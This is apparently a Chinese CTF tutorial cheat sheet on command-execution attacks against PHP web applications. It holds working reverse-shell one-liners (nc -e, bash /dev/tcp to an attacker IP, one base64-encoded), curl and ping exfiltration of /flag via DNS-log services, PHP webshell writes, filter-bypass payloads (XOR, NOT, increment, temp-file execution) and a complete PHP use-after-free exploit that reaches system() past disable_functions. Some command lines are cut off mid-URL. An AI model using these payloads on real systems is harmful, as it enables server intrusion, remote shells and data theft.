## 保姆级命令执行总结

## ASCII码表完整版

|   |   |   |   |   |   |   |   |
|---|---|---|---|---|---|---|---|
|ASCII值|控制字符|ASCII值|控制字符|ASCII值|控制字符|ASCII值|控制字符|
|0|NUT|32|(space)|64|@|96|、|
|1|SOH|33|!|65|A|97|a|
|2|STX|34|”|66|B|98|b|
|3|ETX|35|#|67|C|99|c|
|4|EOT|36|$|68|D|100|d|
|5|ENQ|37|%|69|E|101|e|
|6|ACK|38|&|70|F|102|f|
|7|BEL|39|,|71|G|103|g|
|8|BS|40|(|72|H|104|h|
|9|HT|41|)|73|I|105|i|
|10|LF|42|*|74|J|106|j|
|11|VT|43|+|75|K|107|k|
|12|FF|44|,|76|L|108|l|
|13|CR|45|-|77|M|109|m|
|14|SO|46|.|78|N|110|n|
|15|SI|47|/|79|O|111|o|
|16|DLE|48|0|80|P|112|p|
|17|DCI|49|1|81|Q|113|q|
|18|DC2|50|2|82|R|114|r|
|19|DC3|51|3|83|X|115|s|
|20|DC4|52|4|84|T|116|t|
|21|NAK|53|5|85|U|117|u|
|22|SYN|54|6|86|V|118|v|
|23|TB|55|7|87|W|119|w|
|24|CAN|56|8|88|X|120|x|
|25|EM|57|9|89|Y|121|y|
|26|SUB|58|:|90|Z|122|z|
|27|ESC|59|;|91|[|123|{|
|28|FS|60|<|92|/|124|\||
|29|GS|61|=|93|]|125|}|
|30|RS|62|>|94|^|126|~|
|31|US|63|?|95|—|127|DEL|

## 系统命令简介

系统命令，简单解释就是在系统终端可执行的预定义命令，就是大家常见的黑框框。在linux操作系统中，预定义命令默认存储位置为/bin目录，而windows操作系统的预定义命令默认存储位置为C:\Windows\System32，下面将针对linux和win的系统命令做简单介绍。

### 管道符

在win和linux这两种操作系统中，我们可以利用管道符来同时执行多条命令

```
windows：
‘|’ 直接执行后面的语句
‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
‘&’ 前面和后面命令都要执行，无论前面真假
&&如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令

linux：
Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&’ 作用相同
```

### 通配符

在linux操作系统中支持如下两种通配符

```
?   可代替任意一个字符
*   可代替0-任意个字符
```

**例**

```
若当前目录只存在一个名为flag的文件
cat flag <==> cat fla?  <==>  cat f*
```

### 重定向

在linux操作系统中一共有>和>>两个重定向符号

**1.>符号**

用于将命令的标准输出重定向到指定的文件，如果文件不存在，则会创建文件；如果文件已经存在，则会覆盖文件内容。

```
ls > file.txt    
>file.txt
```

**2.>>符号**

将命令的标准输出重定向到指定的文件，但与`>` 不同的是，如果文件已经存在，`>>` 会将输出追加到文件末尾而不是覆盖文件内容。

```
ls >> file.txt
```

### 常见系统命令

在高级语言当中，系统命令通常需要特定的函数才能执行。例如php中的

|   |
|---|
|system()|
|passthru()|
|exec()|
|shell_exec()|
|popen()|
|proc_open()|
|pcntl_exec()|
|``|

python中的例如等

根据函数不同，其所需参数以及回显情况等都会略有不同，需要根据实际情况进行调整

#### windows

|   |   |
|---|---|
|命令|实际效果|
|ipconfig|主要用来查看当前机器内、外网ip|
|type|type filename 查看文件内容|
|cd|目录跳转|
|ping|ping ip或者url 主要用来判断某机器是否可达|
|dir|列出当前目录|
|whoami|查看当前用户，主要用于判断是否可以命令执行|

#### linux

**基础命令**

|   |   |
|---|---|
|命令|实际效果|
|ls|列出当前目录|
|cd|目录跳转|
|rm|删除|
|mv|重命名|
|whoami|查看当前用户|
|uname -a|列出内核版本等详细系统讯息|
|ifconfig|查看当前机器内外网ip|
|ping|判断目标机器是否可达|
|touch|创建文件|
|mkdir|创建目录|

在ctf比赛当中，最常见的就是文件读取命令的绕过，下面是一些常见的**文件读取命令**

|   |   |
|---|---|
|命令|实际效果|
|cat|文件读取|
|tac|文件读取（行倒序输出）|
|more|文件读取（一页一页显示）|
|less|文件读取（一页一页显示，可翻页）|
|head|文件读取（显示头几行）|
|tail|文件读取（显示最后几行）|
|nl|文件读取（会输出行号）|
|vim/vi|文本编辑器，可用于内容查看|
|nano|文本编辑器，可用于内容查看|
|emacs|文本编辑器，可用于内容查看|
|sed -n '1,10p'|文件读取（显示前10行）|
|rev|文件读取（倒序输出）|
|base64|文件读取（以base64形式输出）|
|strings|文件读取（提取文件中可输出的字符串）|
|xxd|文件读取（二进制形式输出）|
|hexdump|文件读取（16进制形式输出）|
|od|文件读取（8进制形式输出）|
|uniq|文件读取（会去掉重复行）|
|cp|文件复制（可用于突破目标文件权限限制）|

#### 其它命令

除了以上的常见命令外还有其它的一些常用命令

##### **find**

常用于在linux系统中查找某文件（支持通配符）的具体位置

```
find / -name flag
find / -name f*
find / -name fla?
/为查找的起始根目录，以上命令会以/（根目录）为查找根目录，在其以及其子目录中查找符合后续命名规则的文件
```

##### **sed**

在某些情况需要对文件内容进行适当修改，但题目环境并未提供vi等文本编辑器，此时可以利用sed达到精准替换某行的目的

```
实现格式为：
sed -i '行数s/原内容/替换为的内容/' 文件名

sed -i '2s/x\.x\.x\.x/150.158.24.228/' filename
sed -i '3s/7002/7000/' filename
sed -i '4s/.*//' filename
```

PS：

```
1.该命令支持通配符
2.该命令对于特殊符号需要用\进行转义，如上述的例1中的.
```

##### **echo**

如果需要大规模写入内容，可以使用base64编码防止数据丢失，再结合echo将内容写入指定文件

```
实现格式为：
echo 'base64编码的数据' | base64 -d > filename
```

## 二、命令执行

### system类命令执行

所谓system类命令执行即是原题目已经给出system函数，且其参数是可控的这种情况，下面将以php为例着重讲解该情况下的命令执行方式以及绕过姿势

**示例代码**

```
<?php
system($_POST['1']);
?>
```

#### 无回显rce

在1.3节开篇我们提到了很多可执行系统命令的函数，他们都可以达成执行系统命令的目的，但其中的一些函数会不会将执行的结果回显，例如exec函数，此时我们就需要通过某些手法得到回显，下面将对这些手法进行详细讲解

##### 反弹shell

###### **vps简介**

作为一名合格的web手，一台vps是必不可少的，所谓vps就是一台具有公网ip的服务器，可从下面三方厂家获取

1.华为云：[https://www.huaweicloud.com/（云耀云服务器](https://www.huaweicloud.com/%EF%BC%88%E4%BA%91%E8%80%80%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8)）

2.腾讯云：[https://cloud.tencent.com/（轻量型服务器](https://cloud.tencent.com/%EF%BC%88%E8%BD%BB%E9%87%8F%E5%9E%8B%E6%9C%8D%E5%8A%A1%E5%99%A8)）

3.阿里云：[https://www.aliyun.com/](https://www.aliyun.com/)

服务器和我们个人PC电脑最大的区别就是具有公网ip，实际效果就是任意用户皆可达我们的服务器（可ping通），而个人PC电脑绝大多数情况是无法实现该功能的。详细购买流程以及产品讯息可与对应客服探讨，成功购买后即可使用ssh（服务器自带的远程连接工具）或电脑自带的远程桌面功能进行服务器登录

**1.ssh登录**

ssh软件推荐termius

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831396412-e3a9bf8f-8cc7-4bd9-9437-3a7bdeb0a083.png)

从厂家获取账号密码以及公网ip后将其填入1，2，3处，然后点击4处即可远程连接到服务器

**2.电脑自带远程桌面功能登录**（常用于win系统）

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831397558-86cf5648-0c45-4fad-9610-eacbfb653dca.png)

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831396313-69fd5f2c-0456-4de2-a886-de99a6f7c6a1.png)

在此界面输入公网ip，稍后再输入厂家给予的账号密码即可登录成功

###### 反弹手法

**1.nc反弹**

```
正向连接：
linux靶机:nc -e /bin/bash -lvvnp 端口
win靶机:nc -e cmd -lvvnp 端口     
攻击机:nc 靶机ip 端口

反向连接：
linux靶机:nc -e /bin/bash 攻击机ip 端口
win靶机:nc -e cmd 攻击机ip 端口
攻击机:nc -lvvnp 端口
```

**2.bash反弹**

```
攻击机:nc -lvvnp 端口
靶机:bash -c "bash -i >& /dev/tcp/攻击机ip/攻击机监听的端口 0>&1"
数组版靶机（java源码）:bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx}|{base64,-d}|{bash,-i}
```

示例演示

1.在靶机**可达的机器（可ping通，如公网服务器或同网段机器）**上监听端口

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831396436-ceab62f6-d155-4335-8e59-6649e6dcb84e.png)

2.在靶机上执行bash反弹命令

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831396975-bdab4365-9a2a-416c-98d0-8e9546024157.png)

3.查看刚刚监听端口的服务器

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831397120-a637b24a-b3e1-4518-acd6-a215b1f69d35.png)

可以发现反弹shell成功，此时可执行任意系统命令

**3.写shell文件后执行**

```
创建shell.sh
bash -c "bash -i >& /dev/tcp/服务器ip/端口 0>&1"
将上述bash反弹命令写入文件，详见1.2.3节中的echo用法
./shell.sh
利用.执行shell.sh反弹shell
```

**正向连接与反向连接简介**

借用迪总一张图

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831398190-05e8dd5b-30d7-4887-8889-8df5d452decb.png)

PC1、PC2、PC3为我们的目标机器，此时不难发现三台靶机都处于内网环境

正向连接：攻击机主动连接靶机

反向连接：靶机主动连接攻击机

准则：谁被动，谁监听

在上述环境中，有且仅有**可访问路由**、**linux外网服务器**、**windows服务器**这三个ip是可访问的，而我们的三台PC靶机此时处于内网环境，相当于我们的个人PC电脑，此时是无法访问的，我们的外网服务器最多只可致**可访问路由**处，即攻击机无法主动连接到靶机，所以此时就无法正向连接。由于我们外网服务器皆为**公网服务器**，所以三台PC靶机是可以访问到服务器的，即可以进行反向连接，让靶机主动连接攻击机，也就是我上面演示的bash反弹的操作。

##### 数据写出

将命令的执行结果写入其他文件，再访问其他文件获取执行结果，下以1.txt为例

```
利用cp命令：cp flag.php 1.txt

利用mv命令：mv flag.php 1.txt

利用>输出结果到文件：ls > 1.txt

利用tee命令：ls | tee 1.txt    

利用script命令：ls | script 1.txt
```

##### 数据外带

在题目环境出网的条件下，我们可以通过数据外带将命令执行的结果外带出来，此处推荐两个外带网址：

1.[http://dnslog.cn](http://dnslog.cn/)

2.[http://ceye.io/（推荐，更稳定](http://ceye.io/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%8C%E6%9B%B4%E7%A8%B3%E5%AE%9A)）

linux的数据外带归功于其反引号可执行任意系统命令这一特殊机制

```
单行传输：
ping `whoami`.dns地址
curl http:



多行传输：(外带只会显示第一行的数据)
curl http:
curl http:
curl -T /flag http:
```

下面我会就这两个外带平台进行演示

**1.dnslog**

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831397878-f99d6d7d-ee74-42eb-a359-f67e5a412909.png)

首先点击get subdomain，即可获得2所示的url地址，随后即可在靶机执行如下命令

```
ping `whoami`.dns地址
ping `whoami`.b854kz.dnslog.cn
```

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831398665-e19fabbd-10a2-49cb-9ea4-bb1e0df4d971.png)

点几下refresh record（点成get就得重新搞了）即可获得回显，可以得到靶机当前用户为root

**2.ceye**

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831398710-9da0f4b9-17e4-47a3-8a8c-924baf2ec3cd.png)

login处登录后应为profile，在profile出得到url地址后即可执行如下命令

```
curl http:
```

点几下reload即可得到回显结果

##### 盲注

```
import requests
import string
import time

url='http://localhost.test.php/?c='
dic=string.printable[:-6]
flag=''

for i in range(1,50):
    judge=0
    for j in dic:
        now=f'{url}a=$(cat /flag | head -1 | cut -b {i});if [ $a = {j} ];then sleep 2;fi'
        start=time.time()
        r=requests.get(now)
        end=time.time()
        if int(end)-int(start) >1:
            judge=1
            flag+=j
            print(flag)
            break
    if judge==0:
        break

print(flag)
```

**核心命令分析**

```
a=$(cat /flag | head -1 | cut -b {i});if [ $a = {j} ];then sleep 2;fi
```

**第一部分**

```
a=$(cat /flag | head -1 | cut -b {i});
定义变量a，将cat /flag的结果利用head -1取第一行，利用cut -b number取结果的第i（脚本中的循环i）个字符，将字符赋值给a
```

**第二部分**

```
if [ $a = {j} ];
判断得到的变量a是否等于j，j为上述脚本中dic字典的遍历结果
```

**第三部分**

```
then sleep 2;fi
如果判断为真，则睡眠2秒，通过网页是否睡眠判断出flag的每个字母的结果
```

##### 命令行写shell

可以通过命令执行写入shell，然后蚁剑连接，在某些情况会是一个不错的选择

```
echo 'PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=' | base64 -d > ./123.php  



echo '<?php eval(\$_GET[1]);phpinfo();?>' > /var/www/html/2.php
```

#### 长度限制绕过

示例代码

```
<?php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("111");
    }
}
```

此题利用substr函数对eval的代码进行了限制

```
get传参   F=`$F `; sleep 3
经过substr($F,0,6)截取后 得到  `$F `;
也就是会执行 eval("`$F `;");
我们把原来的$F带进去
eval("``$F `;sleep 3`");
也就是说最终会执行  ` `$F `;sleep 3 ` == shell_exec("`$F `; sleep 3");
前面的命令我们不需要管，但是后面的命令我们可以自由控制。
这样就在服务器上成功执行了 sleep 3
所以 最后就是一道无回显的RCE题目了，将sleep 3换成我们2.1.1节中所讲的操作即可得到答案
```

#### 命令绕过

##### 空格

```
$IFS              

{cat,flag.php}                        --这里把，替换成了空格键

%20                                   --代表space键

\x20                                  --代表space键，eval类中可用

%09                                   --需要php环境，如cat%09flag.php

\x09                                  --代表space键，eval类中可用

${IFS}                                --单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS}flag.php

$IFS$9                                --后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php

<                                     --重定向，如cat<flag.php

<>                                    --重定向，如cat<>flag.php
```

##### 字符串拼接绕过

```
a=l;b=s;c=/;$a$b $c
```

定义变量a为l，b为s，c为/，执行命令$a$b $c即ls /

##### base64编码绕过

```
echo MTIzCg==|base64 -d 其将会打印123

echo bHMgLw== | base64 -d | bash 
`echo bHMgLw== | base64 -d`                   ==>三种结果皆为ls /
echo bHMgLw== | base64 -d | sh
```

##### 16进制编码绕过

生成脚本

```
<?php
$a = 'ls /';
echo bin2hex($a);  
?>
```

payload

```
echo 6c73202f | xxd -r -p | bash
`echo 6c73 | xxd -r -p`
echo `6c73202f` | xxd -r -p | sh > 1.txt
```

##### 单双引号绕过

```
ca''t flag 
ca""t flag
l''s /
l""s /
```

##### 反斜杠绕过

```
l\s /
l\s /var/www/ht\ml
ca\t f\ag
```

##### 绕过ip中的句点

```
网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。
可以直接访问http:
```

[数字转ip地址](http://www.msxindl.com/tools/ip/ip_num.asp)

[ip地址转数字](http://www.msxindl.com/tools/ip/ip_num.asp)

[域名转数字ip](http://www.msxindl.com/tools/ip/ip_num.asp)

##### 正则匹配绕过

```
cat flag  =>   cat [e-g]lag
               cat f{k..m}ag
```

两种正则匹配稍有不同：

1.[]为开区间，并**不包含**左右边界

2.{}为闭区间，**包含**左右边界

所以可得，前者只会匹配f，而后者会匹配k,l,m

##### 内敛执行法绕过

```
cat `ls`
```

##### 黑洞绕过

**黑洞：**

```
>/dev/null 2>&1
>代表重定向，会将我们命令执行的所有结果全部丢进预定义的/dev/null这一垃圾桶中，导致我们收不到回显
```

利用管道符绕过,效果详见1.1节

```
ls || >/dev/null 2>&1
```

##### 绕过open_basedir()

**1.ini_set重设置绕过**

```
<?php

ini_set('open_basedir', '/path/to/allowed/directory:/another/allowed/directory');
?>
```

可以设置多个安全目录，目录和目录之间可以使用:进行分隔

**2.UAF脚本绕过安全目录**

使用时需要进行url编码再传入（bp编码）

```php
<?php
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);

                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);

                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag02.txt");ob_end_flush();
?>
```

##### 绕过disable_function

**适用于eval类命令执行**

```
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}

$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}

$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}


$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->getFilename()." ");} 
$a=opendir('/');while(($file = readdir($a)) !=false){echo $file." ";}    
c=var_dump(scandir('/'));
$a=opendir('/');while(($file=readdir($a)) != false) {echo $file."";}
```

如果结果被替换，可以在代码后边加一个exit退出，进而绕过对于结果的替换

```
$a=opendir('/');while(($file=readdir($a)) != false) {echo $file."";}exit();
```

### eval类命令执行

所谓eval类命令执行即原题中给出了eval()这一函数，并让其参数可控

**示例代码**

```
<?php
eval($_POST['1']);
?>
```

eval函数的本质是将任意字符串当作php代码执行，我们在进行get和post传参是传入的参数默认都是字符串形式的，正好也一定会符合这个条件

#### 无字母数字rce

简单来说，无字母数字rce就是把我们可控参数中的数字和字母都ban掉了，我们需要通过不可见字符的运算构造出可见字符，并执行相应命令，下面的绕过姿势本质都是通过不可见字符之间的关系运算构造出我们所需要的字符串并执行我们的恶意命令。

**示例代码**

```
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
eval($_GET['shell']);
}
```

##### 取反绕过

通过取反操作使得原命令变为不可见字符，绕过waf检测，在eval执行时再通过取反操作还原为原恶意命令，进行执行任意恶意代码

**构造脚本1**

```
<?php
$a=urlencode(~('call_user_func'));
$b=urlencode(~('system'));
$c=urlencode(~('whoami'));
echo $a;
echo "\n";
echo $b;
echo "\n";
echo $c;
echo "\n";
echo "(~".$a.")(~".$b.",~".$c.",'');";
?>
```

**构造脚本2**

```
<?php


fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```

##### 异或绕过

通过不可见字符之间的异或运算构造出任意恶意命令，将两个脚本按照规定命名放到同一个目录下，每次使用时需要根据题目代码更换php脚本中的正则部分，更改好运行python代码，根据提示构造即可

xor.php

```
<?php



$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z0-9A-Z]/i'; 
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }

        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)^urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

xor.py

```
import requests
import urllib
from sys import *
import os

def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)

while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"
    print(param)
```

##### 或绕过

通过不可见字符之间的或运算构造出任意恶意命令，将两个脚本按照规定命名放到同一个目录下，每次使用时需要根据题目代码更换php脚本中的正则部分，更改好运行python代码，根据提示构造即可

or.php

```
<?php
$myfile = fopen("or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[b-df-km-uw-z0-9\+\~\{\}]+/i';
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }

        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

or.py

```
import requests
import urllib
from sys import *
import os

os.system("php rce_or.php")  

def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("or.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"
    return (output)

while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command："))

    print(param)
```

##### 自增绕过

通过php的自增特性，构造出恶意字符串assert($_POST[\_]);，进而实现任意代码执行

何为自增？

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831398580-12aa83a3-abaa-4bd6-a951-d3e61d92d030.png)

我们可以发现，A在进行++操作之后变成了B，规律遵循ascii码表，详见开头。以下为构造脚本

```
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
然后post传入   _=phpinfo();
```

##### 临时文件执行

此方法的适用环境稍有不同，以上手法皆为eval类的无字母数字命令执行，而此方法适用于system类命令执行

```
import requests

while True:
    url = "http://url/?c=.+/???/????????[@-[]"
    r = requests.post(url, files={"file": ('1.php', b'cat flag.php')})
    if r.text.find("flag") >0:
        print(r.text)
        break
```

我们通过发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。由于字母数字被过滤，所以所有的字母数字都用?通配符代替

**关于正则部分**

```
. /???/????????[@-[]
```

根据观察，文件的最后一位必定为大写字母，所以可以通过正则强制匹配大写字符增加成功几率，详见开头ascii码表

**关于.**

```
. filename
```

用当前的shell执行一个文件中的命令。当前运行的shell是bash，则. file的意思就是用bash执行filename文件中的命令。所以我们就可以用.来执行我们上传的恶意文件

参考请求包

```
POST /?shell=?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?> HTTP/1.1
Host: 192.168.43.210:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*
```

#### 有或无参数rce

所谓无参数rce就是利用各种已定义函数的复杂搭配，在eval命令执行的条件下成功构造我们所需的恶意代码的操作。例如下方简介表格中的最后一条代码串。

示例代码

```
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

##### 常见函数及简介

|   |   |
|---|---|
|函数|效果|
|include()|包含文件内容|
|require()|包含文件内容|
|include_once()|包含文件内容|
|require_once()|包含文件内容|
|foreach($a as $x => $y)|$a为数组,将数组名和值循环赋值给$x和$y|
|exit($a)|输出$a并退出当前脚本|
|show_source()|显示文件内容|
|file_get_contents()|显示文件内容|
|highlight_file()|显示文件内容|
|readfile()|显示文件内容|
|var_dump()|打印数组，显示文件名|
|printf()|显示文件内容|
|next()|数组指针移动到下一位|
|array_reverse()|数组位置前后调转|
|show_source(next(array_reverse(scandir(current(localeconv())))))|输出当前目录倒数第二个文件内容|
|localeconv()|详细的自己搜，返回一个数组，数组的第一个是小数点字符，因此可以用current()提取一个.|
